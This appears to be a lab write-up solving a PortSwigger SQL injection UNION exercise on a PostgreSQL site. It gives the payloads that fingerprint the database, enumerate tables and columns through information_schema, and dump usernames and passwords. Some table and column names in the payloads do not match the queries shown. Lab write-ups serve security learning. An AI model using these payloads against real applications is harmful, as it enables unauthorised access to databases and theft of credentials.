## Lab Description:

<img width="891" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/1416dc41-d80e-487a-b141-50c121dc04cc">

## Solution:

The database in use here is Postgres (enumerated by injection ' UNION SELECT null,version()--), which holds the table information in the information_schema.tables-table. In the relevant documentation, the available columns are listed. We are interested in table_name. So inject ' UNION SELECT table_name, table_schema from information_schema.tables-- into the parameter to form the following query:

We use an invalid category so that no articles are found and only my output appears.

```SELECT * FROM someTable WHERE category='X' UNION SELECT table_name, null from information_schema.tables--'```

<img width="1281" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/72da75d9-28b1-4065-9215-e3f3cad18116">


<img width="1290" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/71ecf7a0-947b-48de-9a54-c1086781d3e9">

The information_schema.columns view holds information about the columns of each table, specifically the column_name column. The proper string to inject is ' UNION SELECT column_name, null from information_schema.columns WHERE table_name = 'users_kcstmf'-- to form this query

```SELECT * FROM someTable WHERE category='X' UNION SELECT column_name, null from information_schema.columns WHERE table_name = 'users_lrsbaf'--'```

<img width="1285" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/b057e0a5-47c5-4f25-bde8-c1705da1184b">

<img width="1217" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/596acff4-23cb-430f-bd38-9a7a0425945d">

Now we have all information to obtain the required usernames and passwords. Inject ' UNION SELECT username_ujopmd, password_vpnjej from users_kcstmf-- to form this query:

```SELECT * FROM someTable WHERE category='X' UNION SELECT username_spivdg, password_dfxmeh from users_lrsbaf--'```

<img width="1280" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/f0d071fc-f67c-4152-965d-615582113e4b">

<img width="1197" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/0a1e0bc6-e93d-4845-a9df-e3ca5100e0f2">

<img width="1190" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/0ff8431b-162d-4be7-b7d5-16297e8e99d6">

<img width="1202" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/3c6c4f6b-94a5-449e-a4ec-4e3559e1d329">



